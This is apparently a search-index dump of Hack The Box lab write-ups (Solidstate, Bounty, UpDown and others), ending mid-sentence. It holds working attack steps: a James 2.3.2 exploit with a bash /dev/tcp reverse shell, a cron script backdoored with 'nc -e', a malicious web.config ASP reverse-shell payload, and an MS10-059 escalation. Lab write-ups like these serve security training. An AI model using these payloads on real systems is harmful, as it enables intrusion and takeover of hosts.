ntrk****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nDocker https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/\nHashcat https://hashcat.net/wiki/doku.php?id=example_hashes\nRestic https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server https://restic.net/#quickstart https://restic.readthedocs.io/en/latest/050_restore.html#restoring-from-a-snapshot\nRest Server https://github.com/restic/rest-server"
  },
  {
    "objectID": "posts/2019-10-20-htb-writeup-networked/2019-10-20-htb-writeup-networked.html",
    "href": "posts/2019-10-20-htb-writeup-networked/2019-10-20-htb-writeup-networked.html",
    "title": "Networked - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝"
  },
  {
    "objectID": "posts/2019-10-20-htb-writeup-networked/2019-10-20-htb-writeup-networked.html#footnotes",
    "href": "posts/2019-10-20-htb-writeup-networked/2019-10-20-htb-writeup-networked.html#footnotes",
    "title": "Networked - Hack The Box",
    "section": "Footnotes",
    "text": "Footnotes\n\n\na-zA-Z0-9_ /-↩︎"
  },
  {
    "objectID": "posts/2021-03-08-htb-writeup-solidstate/2021-03-08-htb-writeup-solidstate.html",
    "href": "posts/2021-03-08-htb-writeup-solidstate/2021-03-08-htb-writeup-solidstate.html",
    "title": "Solidstate - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nStandard enumeration - nmap, dirb, nikto.\n\n[p3:/git/htb/solidstate]$ nmap -p- 10.10.10.51 PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 119/tcp open nntp 4555/tcp open rsip\n[p3:/git/htb/solidstate]$ nmap -p 22,25,80,110,119,4555 -sCV 10.10.10.51 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello solidstate.htb (10.10.14.3 [10.10.14.3]), 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3 JAMES pop3d 2.3.2 119/tcp open nntp JAMES nntpd (posting ok) 4555/tcp open james-admin JAMES Remote Admin 2.3.2\nDIRB: —- Scanning URL: http://10.10.10.51/ —- ==&gt; DIRECTORY: http://10.10.10.51/assets/ ==&gt; DIRECTORY: http://10.10.10.51/images/ + http://10.10.10.51/index.html (CODE:200|SIZE:7776) + http://10.10.10.51/server-status (CODE:403|SIZE:299)\nNIKTO: -\n\nQuick look at JAMES 2.3.2 we find a authenticated RCE (35513.py) vuln\n\n[p3:/git/htb/solidstate]$ searchsploit JAMES — snip — Apache James Server 2.3.2 - Remote Command Execution | linux/remote/35513.py\nThe script logs in with default credentials (root:root) and creates the user ‘../../../../../../../../etc/bash_completion.d’. Once created, an email containing a malicious payload will be sent which will be triggered once someone logs into the machine.\nModify the payload, execute and verify the results:\n[p3:/git/htb/solidstate]$ python 35513.py 10.10.10.51 (master✱) [+]Connecting to James Remote Administration Tool… [+]Creating user… [+]Connecting to James SMTP server… [+]Sending payload… [+]Done! Payload will be executed once somebody logs in.\n[p3:/git/htb/solidstate]$ telnet 10.10.10.51 4555 Trying 10.10.10.51… Connected to 10.10.10.51. Escape character is ‘^]’. JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands\nlistusers\n  Existing accounts 6\n  user: james\n  user: ../../../../../../../../etc/bash_completion.d\n  user: thomas\n  user: john\n  user: mindy\n  user: mailadmin\n  user james\n[p3:/git/htb/solidstate]$ telnet 10.10.10.51 110 (master✱) Trying 10.10.10.51… Connected to 10.10.10.51. Escape character is ‘^]’. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER ../../../../../../../../etc/bash_completion.d +OK PASS exploit +OK Welcome ../../../../../../../../etc/bash_completion.d LIST +OK 2 1239 1 600 2 639 . RETR 2 +OK Message follows Return-Path: &lt;’@team.pl&gt; Message-ID: 6334054.1.1615365875656.JavaMail.root@solidstate MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost Received: from 10.10.14.6 ([10.10.14.6]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 471 for &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;; Wed, 10 Mar 2021 03:44:35 -0500 (EST) Date: Wed, 10 Mar 2021 03:44:35 -0500 (EST) From: team@team.pl\n  '\n  bash -i &gt;& /dev/tcp/10.10.14.6/4488 0&gt;&1\n\n  .\n\nAs mentioned, to trigger the exploit we need to login to the machine some how. We can’t find anything on port 80, so lets look through all users mailboxes.\n\n[p3:/git/htb/solidstate]$ telnet 10.10.10.51 4555 (master✱) Trying 10.10.10.51… Connected to 10.10.10.51. Escape character is ‘^]’. JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands setpassword john 123 Password for john reset\n[p3:/git/htb/solidstate]$ telnet 10.10.10.51 110 (master✱) Trying 10.10.10.51… Connected to 10.10.10.51. Escape character is ‘^]’. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER john +OK PASS 123 +OK Welcome john list +OK 1 743 1 743 . RETR 1 +OK Message follows Return-Path: mailadmin@localhost Message-ID: 9564574.1.1503422198108.JavaMail.root@solidstate MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for john@localhost; Tue, 22 Aug 2017 13:16:20 -0400 (EDT) Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT) From: mailadmin@localhost Subject: New Hires access John,\n  Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.\n\n  Thank you in advance.\n\n  Respectfully,\n  James\n[p3:/git/htb/solidstate]$ telnet 10.10.10.51 110 (master✱) Trying 10.10.10.51… Connected to 10.10.10.51. Escape character is ‘^]’. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER mindy +OK PASS 123 +OK Welcome mindy list +OK 2 1945 1 1109 2 836 . RETR 1 +OK Message follows Return-Path: mailadmin@localhost Message-ID: 5420213.0.1503422039826.JavaMail.root@solidstate MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for mindy@localhost; Tue, 22 Aug 2017 13:13:42 -0400 (EDT) Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT) From: mailadmin@localhost Subject: Welcome\n  Dear Mindy,\n  Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.\n\n  We are looking forward to you joining our team and your success at Solid State Security.\n\n  Respectfully,\n  James\n  .\nRETR 2\n  +OK Message follows\n  Return-Path: &lt;mailadmin@localhost&gt;\n  Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;\n  MIME-Version: 1.0\n  Content-Type: text/plain; charset=us-ascii\n  Content-Transfer-Encoding: 7bit\n  Delivered-To: mindy@localhost\n  Received: from 192.168.11.142 ([192.168.11.142])\n            by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581\n            for &lt;mindy@localhost&gt;;\n            Tue, 22 Aug 2017 13:17:28 -0400 (EDT)\n  Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)\n  From: mailadmin@localhost\n  Subject: Your Access\n\n  Dear Mindy,\n\n\n  Here are your ssh credentials to access the system. Remember to reset your password after your first login.\n  Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.\n\n  username: mindy\n  pass: P@55W0rd1!2@\n\n  Respectfully,\n  James\n\nWe got creds for mindy:P@55W0rd1!2@, log in with SSH to trigger the expliot reverse shell.\n\n[p3:~]$ nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.6] from (UNKNOWN) [10.10.10.51] 37728 $ whoami mindy\nThe shell seems to trigger as the user whom logged in, however Mindys default shell is ‘/bin/rbash’ - a restricted shell where the user can’t execute anything. With the reverse exploit, we are able to spawn a normal /bin/bash shell.\nmindy@solidstate:~$ cat user.txt 0510e71c2e8c9cb333b36a38080d0dc2\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerating the box we find a /opt/tmp.py, a writable script, owned by root, that cleans /tmp/. By looking at the code one would assume this is ran automatically and regularly. Verify this by creating a file in /tmp and wait.\nModify the code, setup a listener, and wait (a few minutes) for a root shell. NOTE: You can verify your shell syntax by running ‘python tmp.py’ and see if you get the reverse as user mindy.\n\n\\({debian_chroot:+(\\)debian_chroot)}mindy@solidstate:/opt$ cat tmp.py #!/usr/bin/env python import os import sys try: os.system(‘nc -e /bin/bash 10.10.14.6 4499’) except: sys.exit()\n[p3:…esome-scripts-suite/linPEAS]$ nc -lvnp 4499 (master) listening on [any] 4499 … connect to [10.10.14.6] from (UNKNOWN) [10.10.10.51] 49756 whoami root cat /root/root.txt 4f4afb55463c3bc79ab1e906b074953d\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nJames 2.3.2 Exploit: https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf\nPOP3: https://book.hacktricks.xyz/pentesting/pentesting-pop"
  },
  {
    "objectID": "posts/2021-02-28-htb-writeup-bounty/2021-02-28-htb-writeup-bounty.html",
    "href": "posts/2021-02-28-htb-writeup-bounty/2021-02-28-htb-writeup-bounty.html",
    "title": "Bounty - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/bounty]# nmap -Pn -n -sCV 10.10.10.93 –open (master✱) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nDIRB: ==&gt; DIRECTORY: http://10.10.10.93/aspnet_client/ ==&gt; DIRECTORY: http://10.10.10.93/uploadedfiles/\nNIKTO: + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST\n\nVisiting port 80 we only see merlin.jpg, download the image to see if something is hidden within.\n[root:/git/htb/bounty]# binwalk -e merlin.jpg DECIMAL HEXADECIMAL DESCRIPTION ——————————————————————————– 0 0x0 JPEG image data, JFIF standard 1.02 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 332 0x14C JPEG image data, JFIF standard 1.02 7637 0x1DD5 JPEG image data, JFIF standard 1.02\n\nBinwalk doesn’t extract anything, however we can see two other images with offset 332 and 7637. Extract them with dd.\n[root:/git/htb/bounty]# dd if=merlin.jpg of=out.jpg skip=332 bs=1                                                               (master✱)\n  780400+0 records in\n  780400+0 records out\n  780400 bytes (780 kB, 762 KiB) copied, 2.0058 s, 389 kB/s\n\n[root:/git/htb/bounty]# dd if=merlin.jpg of=out2.jpg skip=7637 bs=1                                                             (master✱)\n  773095+0 records in\n  773095+0 records out\n  773095 bytes (773 kB, 755 KiB) copied, 2.52271 s, 306 kB/s\nBoth images have the same illustration, merlin, but are smaller - like a thumbnail. This leads to nothing, move one. Start to fuzz to see if we can find anything else.\nroot@nidus:~/Downloads# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://bounty.htb/FUZZ.aspx\n  --- snip ---\n  transfer                [Status: 200, Size: 941, Words: 89, Lines: 22]\n\nOur new found side, http://10.10.10.93/transfer.aspx, allows us to upload files. We can’t see what file type is allowed by looking at the source, but trying a few we can see .jpg is allowed. By judging of the merlin picture, we should use ‘magic’ (magic byte) to bypass this and get our foothold.\n\nTrying to upload the aspx-file and changing content type from “application/octet-stream” to “image/jpeg” doesn’t work. Changing the filename from “rev.aspx” to “rev.jpg” works and is allowed, however that doesn’t do anything for us.\nTo find all available extensions, intercept the upload and send it to burp intruder. Set the extension as target, and upload the extension list as payload. Run and we find following allowed extensions: gif, jpg, png, doc, config, jpeg, xls, xlsx, docx\nA web.config file lets you customize the way your site or a specific directory on your site behaves. For example, if you place a web.config file in your root directory, it will affect your entire site. If you place it in a /content directory, it will only affect that directory.\nThere is a known RCE vulnerability with web.config-files, download and modify it to trigger a reverse shell.\n[root:/git/htb/bounty]# cat web.config (master✱)   &lt;system.webServer&gt;              &lt;/system.webServer&gt;    &lt;!–- &lt;% Response.write(“-”&“-&gt;”) Response.write(“\n\")\n    Set wShell1 = CreateObject(\"WScript.Shell\")\n    Set cmd1 = wShell1.Exec(\"//10.10.14.8/share/nc64.exe 10.10.14.8 4488 -e cmd\")\n    output1 = cmd1.StdOut.Readall()\n    set cmd1 = nothing: Set wShell1 = nothing\n    Response.write(output1)\n    Response.write(\"\n&lt;!-“&”-“) %&gt; -–&gt;\nStart your SMB Share, upload the ‘web.config’ file, setup a listener and grab the incomming shell.\n[root:/git/htb/bounty]# rlwrap nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.93] 49160 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved.\nc:\\windows\\system32\\inetsrv&gt; whoami\n  bounty\\merlin\n\nc:\\windows\\system32\\inetsrv&gt; type C:\\Users\\merlin\\Desktop\\user.txt\n  e29ad89891462e0b09741e3082f44a2f\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nGrab systeminfo and run windows-exploit-suggester locally.\n\n[root:/git/htb/bounty]# python /opt/windows-exploit-suggester.py –update (master✱) [*] initiating winsploit version 3.3… [+] writing to file 2021-03-04-mssb.xls [*] done [root:/git/htb/bounty]# python /opt/windows-exploit-suggester.py –database 2021-03-04-mssb.xls –systeminfo systeminfo.txt (master✱) [*] initiating winsploit version 3.3… [*] database file detected as xls or xlsx based on extension [*] attempting to read from the systeminfo input file [+] systeminfo input file read successfully (ascii) [*] querying database file for potential vulnerabilities [*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits [*] there are now 197 remaining vulns [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin [+] windows version identified as ‘Windows 2008 R2 64-bit’ [*] [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical [*] http://www.exploit-db.com/exploits/35273/ – Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC [*] http://www.exploit-db.com/exploits/34815/ – Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC [*] [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical [*] done\nHTB don’t want any Kernel exploits to be used, so with that in mind we only have MS10-059 for instant privesc.\n[root:/git/htb/bounty]# cp /opt/windows-kernel-exploits/MS10-059/MS10-059.exe /srv/pub-share (master✱) [root:/git/htb/bounty]# chmod +x /srv/pub-share/MS10-059.exe\nC:&gt; //10.10.14.8/share/MS10-059.exe 10.10.14.8 4499 /Chimichurri/–&gt;This exploit gives you a Local System shell /Chimichurri/–&gt;Changing registry values… /Chimichurri/–&gt;Got SYSTEM token… /Chimichurri/–&gt;Running reverse shell… /Chimichurri/–&gt;Restoring default registry values…\n[root:/git/htb/bounty]# rlwrap nc -lvnp 4499 (master✱) listening on [any] 4499 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.93] 49163 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:&gt; whoami nt authority\nC:&gt; type C:.txt c837f7b699feef5475a0c079f9d4f5ea\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nFile Extension List: https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4\nweb.config RCE: https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/"
  },
  {
    "objectID": "posts/2019-05-29-htb-writeup-luke/2019-05-29-htb-writeup-luke.html",
    "href": "posts/2019-05-29-htb-writeup-luke/2019-05-29-htb-writeup-luke.html",
    "title": "Luke - Hack The Box",
    "section": "",
    "text": "No writeup available.."
  },
  {
    "objectID": "posts/2022-09-07-htb-writeup-updown/2022-09-07-htb-writeup-updown.html",
    "href": "posts/2022-09-07-htb-writeup-updown/2022-09-07-htb-writeup-updown.html",
    "title": "UpDown - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\n➜  updown nmap -Pn -n -p- 10.129.5.88\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n➜  updown nmap -Pn -n -p22,80 -sCV 10.129.5.88\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)\n|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)\n|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Is my Website up ?\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n==&gt; DIRECTORY: http://10.129.5.88/dev/                                                                                                                       \n+ http://10.129.5.88/index.php (CODE:200|SIZE:1131)                                                                                                          \n+ http://10.129.5.88/server-status (CODE:403|SIZE:276)                                                                                                       \n                                                                                                                                                             \n---- Entering directory: http://10.129.5.88/dev/ ----\n+ http://10.129.5.88/dev/.git/HEAD (CODE:200|SIZE:21)                                                                                                        \n+ http://10.129.5.88/dev/index.php (CODE:200|SIZE:0)     \nVisiting the webservice on port 80 we find a site that lets us check if a website is Up or Down. In the footer we find the domain siteisup.htb, add it to /etc/hosts\n\nAs dirbuster found a .git directory, that also have directory listing, we can simply download all the files using wget:\n➜  updown wget --mirror -I /dev/.git siteisup.htb/dev/.git/\nChanging directory to the /dev folder, our zsh shell tells us that we’re now in a git-tracked directory (see the ‘main’-branch hint).\n➜  .git git:(main) pwd\n/htb/updown/siteisup.htb/dev/\nWe can from here run git-commands, find changes and restore files.\n➜  dev git:(main) ✗ git status\nOn branch main\nYour branch is up to date with 'origin/main'.\n\nChanges not staged for commit:\n  (use \"git add/rm &lt;file&gt;...\" to update what will be committed)\n  (use \"git restore &lt;file&gt;...\" to discard changes in working directory)\n    deleted:    .htaccess\n    deleted:    admin.php\n    deleted:    changelog.txt\n    deleted:    checker.php\n    deleted:    index.php\n    deleted:    stylesheet.css\n\n➜  dev git:(main) git restore admin.php changelog.txt checker.php .htaccess index.php stylesheet.css\n➜  dev git:(main) git status\nOn branch main\nYour branch is up to date with 'origin/main'.\n\nnothing to commit, working tree clean\n➜  dev git:(main) ls -al\ntotal 40\ndrwxr-xr-x 3 void void 4096 Sep  6 10:00 .\ndrwxr-xr-x 3 void void 4096 Sep  6 09:55 ..\n-rw-r--r-- 1 void void   59 Sep  6 10:00 admin.php\n-rw-r--r-- 1 void void  147 Sep  6 10:00 changelog.txt\n-rw-r--r-- 1 void void 3145 Sep  6 10:00 checker.php\ndrwxr-xr-x 8 void void 4096 Sep  6 10:00 .git\n-rw-r--r-- 1 void void  117 Sep  6 10:00 .htaccess\n-rw-r--r-- 1 void void  273 Sep  6 10:00 index.php\n-rw-r--r-- 1 void void 5531 Sep  6 10:00 stylesheet.css\nLooking through the files we find that there’s probably a upload function somewhere:\n➜  dev git:(main) cat changelog.txt\nBeta version\n\n1- Check a bunch of websites.\n\n-- ToDo:\n\n1- Multithreading for a faster version :D.\n2- Remove the upload option.\n3- New admin panel.\nInteresting source code from checker.php:\n➜  dev git:(main) cat checker.php\n[... snip ...]\nfunction isitup($url){\n    $ch=curl_init();\n    curl_setopt($ch, CURLOPT_URL, trim($url));\n    curl_setopt($ch, CURLOPT_USERAGENT, \"siteisup.htb beta\");\n    curl_setopt($ch, CURLOPT_HEADER, 1);\n    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);\n    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);\n    curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n    $f = curl_exec($ch);\n    $header = curl_getinfo($ch);\n    if($f AND $header['http_code'] == 200){\n        return array(true,$f);\n    }else{\n        return false;\n    }\n    curl_close($ch);\n}\n\nif($_POST['check']){\n  \n    # File size must be less than 10kb.\n    if ($_FILES['file']['size'] &gt; 10000) {\n        die(\"File too large!\");\n    }\n    $file = $_FILES['file']['name'];\n    \n    # Check if extension is allowed.\n    $ext = getExtension($file);\n    if(preg_match(\"/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i\",$ext)){\n        die(\"Extension not allowed!\");\n    }\n  \n    # Create directory to upload our file.\n    $dir = \"uploads/\".md5(time()).\"/\";\n    if(!is_dir($dir)){\n        mkdir($dir, 0770, true);\n    }\n  \n  # Upload the file.\n    $final_path = $dir.$file;\n    move_uploaded_file($_FILES['file']['tmp_name'], \"{$final_path}\");\n    \n  # Read the uploaded file.\n    $websites = explode(\"\\n\",file_get_contents($final_path));\n    \n    foreach($websites as $site){\n        $site=trim($site);\n        if(!preg_match(\"#file://#i\",$site) && !preg_match(\"#data://#i\",$site) && !preg_match(\"#ftp://#i\",$site)){\n            $check=isitup($site);\n            if($check){\n                echo \"&lt;center&gt;{$site}\n&lt;font color='green'&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;\";\n            }else{\n                echo \"&lt;center&gt;{$site}\n&lt;font color='red'&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;\";\n            }   \n        }else{\n            echo \"&lt;center&gt;&lt;font color='red'&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;\";\n        }\n    }\n    \n  # Delete the uploaded file.\n    @unlink($final_path);\n}\nIndex.php:\n➜  dev git:(main) cat index.php\n&lt;b&gt;This is only for developers&lt;/b&gt;\n\n\n&lt;a href=\"?page=admin\"&gt;Admin Panel&lt;/a&gt;\n&lt;?php\n    define(\"DIRECTACCESS\",false);\n    $page=$_GET['page'];\n    if($page && !preg_match(\"/bin|usr|home|var|etc/i\",$page)){\n        include($_GET['page'] . \".php\");\n    }else{\n        include(\"checker.php\");\n    }   \n?&gt;\nNo matter how much 